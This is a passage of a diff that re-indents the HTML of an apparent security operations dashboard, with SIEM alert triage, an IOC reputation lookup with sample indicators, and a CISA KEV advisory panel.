@@ -524,1110 +524,1105 @@
         </style>
         </head>
 
-        <body>
 
-            <div class="soc-wrapper">
-                <!-- LEFT NAVIGATION SIDEBAR -->
-                <aside class="soc-sidebar" id="socSidebar">
-                    <div class="soc-brand">
-                        <svg width="30" height="30" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M16 2L4 7V15.5C4 23.08 9.12 29.98 16 32C22.88 29.98 28 23.08 28 15.5V7L16 2Z"
-                                fill="#0284C7" fill-opacity="0.2" stroke="#38BDF8" stroke-width="2"
-                                stroke-linejoin="round" />
-                            <path d="M16 8L9 11V16C9 20.5 11.98 24.6 16 26C20.02 24.6 23 20.5 23 16V11L16 8Z"
-                                stroke="#38BDF8" stroke-width="1.5" stroke-dasharray="2 2" />
-                            <circle cx="16" cy="16" r="3" fill="#38BDF8" />
-                        </svg>
-                        <div>
-                            <div class="fw-bold tracking-tight" style="font-size: 0.98rem; letter-spacing: -0.02em;">
-                                AEGIS<span style="color: var(--soc-accent);">SOC</span></div>
-                            <div class="mono text-secondary" style="font-size: 0.66rem;">SIEM + SOAR v4.8</div>
-                        </div>
+        <div class="soc-wrapper">
+            <!-- LEFT NAVIGATION SIDEBAR -->
+            <aside class="soc-sidebar" id="socSidebar">
+                <div class="soc-brand">
+                    <svg width="30" height="30" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16 2L4 7V15.5C4 23.08 9.12 29.98 16 32C22.88 29.98 28 23.08 28 15.5V7L16 2Z"
+                            fill="#0284C7" fill-opacity="0.2" stroke="#38BDF8" stroke-width="2"
+                            stroke-linejoin="round" />
+                        <path d="M16 8L9 11V16C9 20.5 11.98 24.6 16 26C20.02 24.6 23 20.5 23 16V11L16 8Z"
+                            stroke="#38BDF8" stroke-width="1.5" stroke-dasharray="2 2" />
+                        <circle cx="16" cy="16" r="3" fill="#38BDF8" />
+                    </svg>
+                    <div>
+                        <div class="fw-bold tracking-tight" style="font-size: 0.98rem; letter-spacing: -0.02em;">
+                            AEGIS<span style="color: var(--soc-accent);">SOC</span></div>
+                        <div class="mono text-secondary" style="font-size: 0.66rem;">SIEM + SOAR v4.8</div>
                     </div>
+                </div>
 
-                    <!-- Inject Navigation Menu -->
-                    <div class="py-3 flex-grow-1">
-                        <div class="text-uppercase text-secondary small fw-bold px-3 mb-2"
-                            style="font-size: 0.65rem; letter-spacing: 0.05em;">Workspaces</div>
-                        <a class="soc-nav-link active" data-tab="tab-siem" onclick="switchWorkspaceTab('tab-siem')">
-                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2">
-                                <path d="M22 12h-4l-3 9L9 3l-3 9H2" /></svg>
-                            SIEM Triage <span class="badge bg-info text-dark ms-auto mono" id="navQueueBadge"
-                                style="font-size: 0.65rem;">0</span>
-                        </a>
-                        <a class="soc-nav-link" data-tab="tab-ioc" onclick="switchWorkspaceTab('tab-ioc')">
-                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2">
-                                <circle cx="11" cy="11" r="8" />
-                                <line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
-                            Threat Intel Sandbox
-                        </a>
-                        <a class="soc-nav-link" data-tab="tab-advisories"
-                            onclick="switchWorkspaceTab('tab-advisories')">
-                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                <!-- Inject Navigation Menu -->
+                <div class="py-3 flex-grow-1">
+                    <div class="text-uppercase text-secondary small fw-bold px-3 mb-2"
+                        style="font-size: 0.65rem; letter-spacing: 0.05em;">Workspaces</div>
+                    <a class="soc-nav-link active" data-tab="tab-siem" onclick="switchWorkspaceTab('tab-siem')">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M22 12h-4l-3 9L9 3l-3 9H2" /></svg>
+                        SIEM Triage <span class="badge bg-info text-dark ms-auto mono" id="navQueueBadge"
+                            style="font-size: 0.65rem;">0</span>
+                    </a>
+                    <a class="soc-nav-link" data-tab="tab-ioc" onclick="switchWorkspaceTab('tab-ioc')">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <circle cx="11" cy="11" r="8" />
+                            <line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
+                        Threat Intel Sandbox
+                    </a>
+                    <a class="soc-nav-link" data-tab="tab-advisories" onclick="switchWorkspaceTab('tab-advisories')">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path
+                                d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
+                            <line x1="12" y1="9" x2="12" y2="13" />
+                            <line x1="12" y1="17" x2="12.01" y2="17" /></svg>
+                        CISA KEV Sweeper
+                    </a>
+                </div>
+
+                <!-- Active Mitigations -->
+                <div class="p-3 border-top mt-auto" style="border-color: var(--soc-border) !important;">
+                    <div class="text-uppercase text-secondary small fw-bold mb-2"
+                        style="font-size: 0.65rem; letter-spacing: 0.05em;">Active Mitigations</div>
+                    <div class="d-flex justify-content-between small mb-2 mono">
+                        <span class="text-secondary">Blocked IPs</span>
+                        <span class="text-warning" id="sidebarBlockedCount">0</span>
+                    </div>
+                    <div class="d-flex justify-content-between small mb-3 mono">
+                        <span class="text-secondary">Isolated Hosts</span>
+                        <span class="text-danger" id="sidebarIsolatedCount">0</span>
+                    </div>
+                    <div id="sidebarBlocklistPreview" class="mono small text-truncate" style="font-size: 0.65rem;">
+                    </div>
+                </div>
+            </aside>
+
+            <!-- MAIN WORKSPACE -->
+            <main class="soc-main-container">
+
+                <!-- Top KPI Bar -->
+                <header class="soc-topbar d-flex justify-content-between align-items-center">
+                    <div class="d-flex gap-3 align-items-center flex-grow-1">
+                        <button class="btn btn-sm btn-outline-secondary d-lg-none"
+                            onclick="document.getElementById('socSidebar').classList.add('mobile-open')">☰</button>
+
+                        <div class="kpi-card flex-grow-1" style="max-width: 200px;">
+                            <div>
+                                <div class="kpi-label">Open Critical</div>
+                                <div class="kpi-value text-danger" id="kpiCriticalCount">0</div>
+                            </div>
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ef4444"
                                 stroke-width="2">
                                 <path
                                     d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
                                 <line x1="12" y1="9" x2="12" y2="13" />
                                 <line x1="12" y1="17" x2="12.01" y2="17" /></svg>
-                            CISA KEV Sweeper
-                        </a>
-                    </div>
-
-                    <!-- Active Mitigations -->
-                    <div class="p-3 border-top mt-auto" style="border-color: var(--soc-border) !important;">
-                        <div class="text-uppercase text-secondary small fw-bold mb-2"
-                            style="font-size: 0.65rem; letter-spacing: 0.05em;">Active Mitigations</div>
-                        <div class="d-flex justify-content-between small mb-2 mono">
-                            <span class="text-secondary">Blocked IPs</span>
-                            <span class="text-warning" id="sidebarBlockedCount">0</span>
                         </div>
-                        <div class="d-flex justify-content-between small mb-3 mono">
-                            <span class="text-secondary">Isolated Hosts</span>
-                            <span class="text-danger" id="sidebarIsolatedCount">0</span>
-                        </div>
-                        <div id="sidebarBlocklistPreview" class="mono small text-truncate" style="font-size: 0.65rem;">
-                        </div>
-                    </div>
-                </aside>
 
-                <!-- MAIN WORKSPACE -->
-                <main class="soc-main-container">
-
-                    <!-- Top KPI Bar -->
-                    <header class="soc-topbar d-flex justify-content-between align-items-center">
-                        <div class="d-flex gap-3 align-items-center flex-grow-1">
-                            <button class="btn btn-sm btn-outline-secondary d-lg-none"
-                                onclick="document.getElementById('socSidebar').classList.add('mobile-open')">☰</button>
-
-                            <div class="kpi-card flex-grow-1" style="max-width: 200px;">
-                                <div>
-                                    <div class="kpi-label">Open Critical</div>
-                                    <div class="kpi-value text-danger" id="kpiCriticalCount">0</div>
-                                </div>
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ef4444"
-                                    stroke-width="2">
-                                    <path
-                                        d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
-                                    <line x1="12" y1="9" x2="12" y2="13" />
-                                    <line x1="12" y1="17" x2="12.01" y2="17" /></svg>
+                        <div class="kpi-card flex-grow-1" style="max-width: 200px;">
+                            <div>
+                                <div class="kpi-label">Filtered Queue</div>
+                                <div class="kpi-value text-info" id="kpiFilteredCount">0</div>
                             </div>
-
-                            <div class="kpi-card flex-grow-1" style="max-width: 200px;">
-                                <div>
-                                    <div class="kpi-label">Filtered Queue</div>
-                                    <div class="kpi-value text-info" id="kpiFilteredCount">0</div>
-                                </div>
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8"
-                                    stroke-width="2">
-                                    <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3" /></svg>
-                            </div>
-
-                            <div class="kpi-card flex-grow-1 d-none d-md-flex" style="max-width: 240px;">
-                                <div>
-                                    <div class="kpi-label">Threat Posture</div>
-                                    <div class="kpi-value text-warning" id="kpiThreatLevel">DEFCON 3</div>
-                                </div>
-                                <div class="live-dot"></div>
-                            </div>
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8"
+                                stroke-width="2">
+                                <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3" /></svg>
                         </div>
 
-                        <div class="d-flex align-items-center gap-3 ms-3">
-                            <div class="mono text-secondary d-none d-xl-block" id="utcClock" style="font-size: 0.8rem;">
+                        <div class="kpi-card flex-grow-1 d-none d-md-flex" style="max-width: 240px;">
+                            <div>
+                                <div class="kpi-label">Threat Posture</div>
+                                <div class="kpi-value text-warning" id="kpiThreatLevel">DEFCON 3</div>
                             </div>
-                            <button class="btn btn-sm btn-outline-secondary rounded-circle p-2" onclick="toggleTheme()"
-                                title="Toggle Theme">
-                                <svg id="themeIconSun" width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                    stroke="currentColor" stroke-width="2" class="d-none">
-                                    <circle cx="12" cy="12" r="5" />
-                                    <line x1="12" y1="1" x2="12" y2="3" />
-                                    <line x1="12" y1="21" x2="12" y2="23" />
-                                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64" />
-                                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78" />
-                                    <line x1="1" y1="12" x2="3" y2="12" />
-                                    <line x1="21" y1="12" x2="23" y2="12" />
-                                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36" />
-                                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22" /></svg>
-                                <svg id="themeIconMoon" width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                    stroke="currentColor" stroke-width="2">
-                                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" /></svg>
-                            </button>
-                            <button class="btn btn-danger btn-sm fw-semibold d-flex align-items-center gap-2 mono"
-                                onclick="simulateIncomingAlert()">
-                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                    stroke-width="2">
-                                    <path
-                                        d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2" />
-                                </svg>
-                                Simulate Alert
-                            </button>
-                        </div>
-                    </header>
-
-                    <!-- Global Advisory Ticker -->
-                    <div class="advisory-ticker-bar mono">
-                        <span class="text-danger fw-bold pe-2 border-end"
-                            style="border-color: var(--soc-border) !important;">NCSC / CISA LIVE</span>
-                        <div class="ticker-content" id="advisoryTickerContent">
-                            <!-- Rendered via JS -->
+                            <div class="live-dot"></div>
                         </div>
                     </div>
 
-                    <!-- Workspace Split Container -->
-                    <div class="soc-workspace-split">
+                    <div class="d-flex align-items-center gap-3 ms-3">
+                        <div class="mono text-secondary d-none d-xl-block" id="utcClock" style="font-size: 0.8rem;">
+                        </div>
+                        <button class="btn btn-sm btn-outline-secondary rounded-circle p-2" onclick="toggleTheme()"
+                            title="Toggle Theme">
+                            <svg id="themeIconSun" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2" class="d-none">
+                                <circle cx="12" cy="12" r="5" />
+                                <line x1="12" y1="1" x2="12" y2="3" />
+                                <line x1="12" y1="21" x2="12" y2="23" />
+                                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64" />
+                                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78" />
+                                <line x1="1" y1="12" x2="3" y2="12" />
+                                <line x1="21" y1="12" x2="23" y2="12" />
+                                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36" />
+                                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22" /></svg>
+                            <svg id="themeIconMoon" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" /></svg>
+                        </button>
+                        <button class="btn btn-danger btn-sm fw-semibold d-flex align-items-center gap-2 mono"
+                            onclick="simulateIncomingAlert()">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2">
+                                <path
+                                    d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2" />
+                            </svg>
+                            Simulate Alert
+                        </button>
+                    </div>
+                </header>
 
-                        <!-- CENTER PANE (Dynamic Content) -->
-                        <div class="soc-center-pane position-relative">
+                <!-- Global Advisory Ticker -->
+                <div class="advisory-ticker-bar mono">
+                    <span class="text-danger fw-bold pe-2 border-end"
+                        style="border-color: var(--soc-border) !important;">NCSC / CISA LIVE</span>
+                    <div class="ticker-content" id="advisoryTickerContent">
+                        <!-- Rendered via JS -->
+                    </div>
+                </div>
 
-                            <!-- Tab 1: SIEM Triage Queue -->
-                            <div id="tab-siem" class="workspace-tab h-100 d-flex flex-column">
-                                <div class="d-flex flex-wrap justify-content-between align-items-center mb-3 gap-2">
-                                    <h5 class="fw-bold m-0 d-flex align-items-center gap-2">
-                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"
-                                            stroke="currentColor" stroke-width="2">
-                                            <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
-                                            <line x1="3" y1="9" x2="21" y2="9" />
-                                            <line x1="9" y1="21" x2="9" y2="9" /></svg>
-                                        Active Telemetry Queue
-                                    </h5>
-                                    <div class="d-flex gap-2">
-                                        <input type="text" id="siemSearchInput"
-                                            class="form-control form-control-sm bg-dark text-light border-secondary mono"
-                                            placeholder="Search IP, Host, CVE..." style="width: 200px;"
-                                            oninput="renderSiemTable()">
-                                        <select id="filterSeverity"
-                                            class="form-select form-select-sm bg-dark text-light border-secondary mono"
-                                            style="width: 120px;" onchange="renderSiemTable()">
-                                            <option value="ALL">All Severity</option>
-                                            <option value="Critical">Critical</option>
-                                            <option value="High">High</option>
-                                            <option value="Medium">Medium</option>
-                                            <option value="Low">Low</option>
-                                        </select>
-                                        <select id="filterStatus"
-                                            class="form-select form-select-sm bg-dark text-light border-secondary mono"
-                                            style="width: 130px;" onchange="renderSiemTable()">
-                                            <option value="ALL">All Status</option>
-                                            <option value="New">New</option>
-                                            <option value="Investigating">Investigating</option>
-                                            <option value="Contained">Contained</option>
-                                            <option value="False Positive">False Positive</option>
-                                        </select>
-                                        <button class="btn btn-outline-secondary btn-sm mono"
-                                            onclick="resetSiemFilters()" title="Clear Filters"><svg width="14"
-                                                height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                                stroke-width="2">
-                                                <line x1="18" y1="6" x2="6" y2="18" />
-                                                <line x1="6" y1="6" x2="18" y2="18" /></svg></button>
-                                        <button class="btn btn-outline-info btn-sm mono" onclick="exportAllAlertsJson()"
-                                            title="Export JSON"><svg width="14" height="14" viewBox="0 0 24 24"
-                                                fill="none" stroke="currentColor" stroke-width="2">
-                                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
-                                                <polyline points="7 10 12 15 17 10" />
-                                                <line x1="12" y1="15" x2="12" y2="3" /></svg></button>
-                                    </div>
-                                </div>
+                <!-- Workspace Split Container -->
+                <div class="soc-workspace-split">
 
-                                <div class="soc-card flex-grow-1 overflow-auto">
-                                    <table class="table table-borderless table-hover siem-table w-100">
-                                        <thead>
-                                            <tr>
-                                                <th style="width: 11%;">Alert ID / Time</th>
-                                                <th style="width: 10%;">Severity</th>
-                                                <th style="width: 22%;">Detection Title</th>
-                                                <th style="width: 18%;">MITRE ATT&CK</th>
-                                                <th style="width: 14%;">Entities</th>
-                                                <th style="width: 9%;">Status</th>
-                                                <th style="width: 9%;">Assignee</th>
-                                                <th style="width: 7%;" class="text-end">Actions</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody id="siemTableBody">
-                                            <!-- Rendered via JS -->
-                                        </tbody>
-                                    </table>
-                                </div>
-                            </div>
+                    <!-- CENTER PANE (Dynamic Content) -->
+                    <div class="soc-center-pane position-relative">
 
-                            <!-- Tab 2: Threat Intel Sandbox -->
-                            <div id="tab-ioc" class="workspace-tab d-none">
-                                <h5 class="fw-bold mb-3 d-flex align-items-center gap-2">
+                        <!-- Tab 1: SIEM Triage Queue -->
+                        <div id="tab-siem" class="workspace-tab h-100 d-flex flex-column">
+                            <div class="d-flex flex-wrap justify-content-between align-items-center mb-3 gap-2">
+                                <h5 class="fw-bold m-0 d-flex align-items-center gap-2">
                                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                         stroke-width="2">
+                                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
+                                        <line x1="3" y1="9" x2="21" y2="9" />
+                                        <line x1="9" y1="21" x2="9" y2="9" /></svg>
+                                    Active Telemetry Queue
+                                </h5>
+                                <div class="d-flex gap-2">
+                                    <input type="text" id="siemSearchInput"
+                                        class="form-control form-control-sm bg-dark text-light border-secondary mono"
+                                        placeholder="Search IP, Host, CVE..." style="width: 200px;"
+                                        oninput="renderSiemTable()">
+                                    <select id="filterSeverity"
+                                        class="form-select form-select-sm bg-dark text-light border-secondary mono"
+                                        style="width: 120px;" onchange="renderSiemTable()">
+                                        <option value="ALL">All Severity</option>
+                                        <option value="Critical">Critical</option>
+                                        <option value="High">High</option>
+                                        <option value="Medium">Medium</option>
+                                        <option value="Low">Low</option>
+                                    </select>
+                                    <select id="filterStatus"
+                                        class="form-select form-select-sm bg-dark text-light border-secondary mono"
+                                        style="width: 130px;" onchange="renderSiemTable()">
+                                        <option value="ALL">All Status</option>
+                                        <option value="New">New</option>
+                                        <option value="Investigating">Investigating</option>
+                                        <option value="Contained">Contained</option>
+                                        <option value="False Positive">False Positive</option>
+                                    </select>
+                                    <button class="btn btn-outline-secondary btn-sm mono" onclick="resetSiemFilters()"
+                                        title="Clear Filters"><svg width="14" height="14" viewBox="0 0 24 24"
+                                            fill="none" stroke="currentColor" stroke-width="2">
+                                            <line x1="18" y1="6" x2="6" y2="18" />
+                                            <line x1="6" y1="6" x2="18" y2="18" /></svg></button>
+                                    <button class="btn btn-outline-info btn-sm mono" onclick="exportAllAlertsJson()"
+                                        title="Export JSON"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                                            stroke="currentColor" stroke-width="2">
+                                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+                                            <polyline points="7 10 12 15 17 10" />
+                                            <line x1="12" y1="15" x2="12" y2="3" /></svg></button>
+                                </div>
+                            </div>
+
+                            <div class="soc-card flex-grow-1 overflow-auto">
+                                <table class="table table-borderless table-hover siem-table w-100">
+                                    <thead>
+                                        <tr>
+                                            <th style="width: 11%;">Alert ID / Time</th>
+                                            <th style="width: 10%;">Severity</th>
+                                            <th style="width: 22%;">Detection Title</th>
+                                            <th style="width: 18%;">MITRE ATT&CK</th>
+                                            <th style="width: 14%;">Entities</th>
+                                            <th style="width: 9%;">Status</th>
+                                            <th style="width: 9%;">Assignee</th>
+                                            <th style="width: 7%;" class="text-end">Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="siemTableBody">
+                                        <!-- Rendered via JS -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- Tab 2: Threat Intel Sandbox -->
+                        <div id="tab-ioc" class="workspace-tab d-none">
+                            <h5 class="fw-bold mb-3 d-flex align-items-center gap-2">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2">
+                                    <circle cx="11" cy="11" r="8" />
+                                    <line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
+                                IOC Enrichment & Reputation Sandbox
+                            </h5>
+                            <div class="soc-card p-4 mb-4">
+                                <label class="form-label text-secondary small fw-bold text-uppercase mono">Indicator
+                                    of Compromise (IP, Hash, Domain)</label>
+                                <div class="input-group">
+                                    <input type="text" id="iocInput"
+                                        class="form-control bg-dark text-light border-secondary mono"
+                                        placeholder="e.g., 185.220.101.44 or e3b0c442...">
+                                    <button class="btn btn-info fw-semibold mono px-4"
+                                        onclick="runIocEnrichment()">Analyze Risk</button>
+                                </div>
+                                <div class="mt-3 d-flex flex-wrap gap-2">
+                                    <span class="text-secondary small me-2 mt-1">Samples:</span>
+                                    <span class="sample-chip" onclick="quickFillIoc('185.220.101.44')">185.220.101.44
+                                        (C2)</span>
+                                    <span class="sample-chip"
+                                        onclick="quickFillIoc('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')">SHA-256
+                                        Hash</span>
+                                    <span class="sample-chip" onclick="quickFillIoc('91.214.124.88')">91.214.124.88
+                                        (AiTM)</span>
+                                    <span class="sample-chip"
+                                        onclick="quickFillIoc('login-micros0ft-auth.com')">login-micros0ft-auth.com</span>
+                                    <span class="sample-chip" onclick="quickFillIoc('8.8.8.8')">8.8.8.8
+                                        (Safe)</span>
+                                </div>
+                            </div>
+                            <div id="iocResultsContainer">
+                                <!-- Results rendered via JS -->
+                                <div class="text-center p-5 text-secondary border rounded"
+                                    style="border: 1px dashed var(--soc-border) !important;">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                        stroke-width="1.5" class="mb-2 opacity-50">
                                         <circle cx="11" cy="11" r="8" />
                                         <line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
-                                    IOC Enrichment & Reputation Sandbox
-                                </h5>
-                                <div class="soc-card p-4 mb-4">
-                                    <label class="form-label text-secondary small fw-bold text-uppercase mono">Indicator
-                                        of Compromise (IP, Hash, Domain)</label>
-                                    <div class="input-group">
-                                        <input type="text" id="iocInput"
-                                            class="form-control bg-dark text-light border-secondary mono"
-                                            placeholder="e.g., 185.220.101.44 or e3b0c442...">
-                                        <button class="btn btn-info fw-semibold mono px-4"
-                                            onclick="runIocEnrichment()">Analyze Risk</button>
-                                    </div>
-                                    <div class="mt-3 d-flex flex-wrap gap-2">
-                                        <span class="text-secondary small me-2 mt-1">Samples:</span>
-                                        <span class="sample-chip"
-                                            onclick="quickFillIoc('185.220.101.44')">185.220.101.44 (C2)</span>
-                                        <span class="sample-chip"
-                                            onclick="quickFillIoc('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')">SHA-256
-                                            Hash</span>
-                                        <span class="sample-chip" onclick="quickFillIoc('91.214.124.88')">91.214.124.88
-                                            (AiTM)</span>
-                                        <span class="sample-chip"
-                                            onclick="quickFillIoc('login-micros0ft-auth.com')">login-micros0ft-auth.com</span>
-                                        <span class="sample-chip" onclick="quickFillIoc('8.8.8.8')">8.8.8.8
-                                            (Safe)</span>
-                                    </div>
-                                </div>
-                                <div id="iocResultsContainer">
-                                    <!-- Results rendered via JS -->
-                                    <div class="text-center p-5 text-secondary border rounded"
-                                        style="border: 1px dashed var(--soc-border) !important;">
-                                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none"
-                                            stroke="currentColor" stroke-width="1.5" class="mb-2 opacity-50">
-                                            <circle cx="11" cy="11" r="8" />
-                                            <line x1="21" y1="21" x2="16.65" y2="16.65" /></svg>
-                                        <div class="mono small">Awaiting Indicator Input for Threat Intel Sweep...
-                                        </div>
+                                    <div class="mono small">Awaiting Indicator Input for Threat Intel Sweep...
                                     </div>
                                 </div>
                             </div>
-
-                            <!-- Tab 3: CISA KEV Advisories -->
-                            <div id="tab-advisories" class="workspace-tab d-none">
-                                <div class="d-flex justify-content-between align-items-center mb-3">
-                                    <h5 class="fw-bold m-0 d-flex align-items-center gap-2">
-                                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"
-                                            stroke="currentColor" stroke-width="2">
-                                            <path
-                                                d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
-                                            <line x1="12" y1="9" x2="12" y2="13" />
-                                            <line x1="12" y1="17" x2="12.01" y2="17" /></svg>
-                                        Known Exploited Vulnerabilities (KEV)
-                                    </h5>
-                                    <span
-                                        class="badge bg-danger-subtle text-danger border border-danger-subtle mono">CISA
-                                        DATASTREAM ACTIVE</span>
-                                </div>
-                                <p class="text-secondary small mb-4">Latest critical vulnerabilities being actively
-                                    exploited in the wild. Use the sweep function to hunt for historical indicators
-                                    across the local SIEM data lake.</p>
-                                <div class="row g-3" id="advisoriesGrid">
-                                    <!-- Rendered via JS -->
-                                </div>
-                            </div>
-
                         </div>
 
-                        <!-- RIGHT DRAWER (SOAR Playbook) -->
-                        <aside class="soc-right-drawer collapsed" id="soarDrawer">
-                            <!-- Drawer Header -->
-                            <div class="p-3 border-bottom"
-                                style="border-color: var(--soc-border) !important; background: var(--soc-bg-elevated);">
-                                <div class="d-flex justify-content-between align-items-start mb-2">
-                                    <div>
-                                        <span class="mono fw-bold text-info" id="drawerAlertId">ALT-0000</span>
-                                        <span
-                                            class="badge bg-success-subtle text-success border border-success-subtle ms-2 d-none"
-                                            id="drawerContainedBadge">CONTAINED</span>
-                                    </div>
-                                    <div class="d-flex gap-2">
-                                        <button class="btn btn-sm btn-outline-secondary p-1"
-                                            onclick="exportIncidentMarkdown()" title="Export .MD Report">
-                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                                stroke="currentColor" stroke-width="2">
-                                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
-                                                <polyline points="7 10 12 15 17 10" />
-                                                <line x1="12" y1="15" x2="12" y2="3" /></svg>
-                                        </button>
-                                        <button class="btn btn-sm btn-outline-secondary p-1"
-                                            onclick="toggleRightDrawer()" title="Close Drawer">
-                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
-                                                stroke="currentColor" stroke-width="2">
-                                                <line x1="18" y1="6" x2="6" y2="18" />
-                                                <line x1="6" y1="6" x2="18" y2="18" /></svg>
-                                        </button>
-                                    </div>
-                                </div>
-                                <h6 class="fw-bold mb-2" id="drawerAlertTitle"
-                                    style="font-size: 0.95rem; line-height: 1.3;">Alert Title</h6>
-                                <div class="d-flex align-items-center gap-2 mb-3">
-                                    <span id="drawerSeverityBadge" class="badge-sev">SEV</span>
-                                    <div class="dropdown">
-                                        <select
-                                            class="form-select form-select-sm bg-dark text-light border-secondary mono py-0"
-                                            style="font-size: 0.7rem; width: 140px; height: 24px;"
-                                            id="drawerStatusSelect" onchange="updateActiveAlertStatus(this.value)">
-                                            <option value="New">Status: New</option>
-                                            <option value="Investigating">Status: Investigating</option>
-                                            <option value="Contained">Status: Contained</option>
-                                            <option value="False Positive">Status: False Positive</option>
-                                        </select>
-                                    </div>
-                                    <div class="dropdown">
-                                        <select
-                                            class="form-select form-select-sm bg-dark text-light border-secondary mono py-0"
-                                            style="font-size: 0.7rem; width: 140px; height: 24px;"
-                                            id="drawerAssigneeSelect" onchange="updateActiveAlertAssignee(this.value)">
-                                            <option value="Unassigned">Assign to: Unassigned</option>
-                                            <option value="A. Mercer (T2)">Assign to: A. Mercer</option>
-                                            <option value="M. Patel (IR Lead)">Assign to: M. Patel</option>
-                                            <option value="S. Chen (T3 Threat Hunt)">Assign to: S. Chen</option>
-                                        </select>
-                                    </div>
-                                </div>
-
-                                <div class="p-2 rounded bg-dark border border-secondary" style="font-size: 0.75rem;">
-                                    <div class="row g-2 mono">
-                                        <div class="col-6">
-                                            <div class="text-secondary" style="font-size: 0.65rem;">Source /
-                                                Attacker IP
-                                            </div>
-                                            <div class="text-warning d-flex align-items-center gap-1 cursor-pointer"
-                                                onclick="pivotiocFromDrawer()" title="Pivot to Threat Intel">
-                                                <span id="drawerSrcIp">0.0.0.0</span>
-                                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none"
-                                                    stroke="currentColor" stroke-width="2">
-                                                    <path
-                                                        d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
-                                                    <polyline points="15 3 21 3 21 9" />
-                                                    <line x1="10" y1="14" x2="21" y2="3" /></svg>
-                                            </div>
-                                        </div>
-                                        <div class="col-6">
-                                            <div class="text-secondary" style="font-size: 0.65rem;">Target Endpoint
-                                            </div>
-                                            <div class="text-light fw-bold" id="drawerHostname">HOST</div>
-                                        </div>
-                                        <div class="col-12 mt-1 border-top pt-1 border-secondary">
-                                            <div class="text-secondary" style="font-size: 0.65rem;">MITRE ATT&CK /
-                                                CVE
-                                            </div>
-                                            <div class="text-light text-truncate" id="drawerMitre">T0000</div>
